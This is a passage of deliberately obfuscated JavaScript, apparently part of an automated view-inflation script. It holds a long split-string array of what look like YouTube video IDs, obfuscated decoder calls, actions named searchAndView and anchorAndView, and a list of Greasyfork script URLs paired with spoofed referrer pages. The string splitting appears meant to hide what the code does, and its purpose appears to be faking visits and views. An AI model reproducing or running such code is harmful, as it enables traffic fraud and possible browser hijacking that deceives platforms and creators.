    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    W(0xe) + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    X(0x9) + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    W(0x0) + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    X(0x5) + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x17) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + Y(0x14, 'Ny3v')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x2) + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + X(0x1a) + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0xb)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
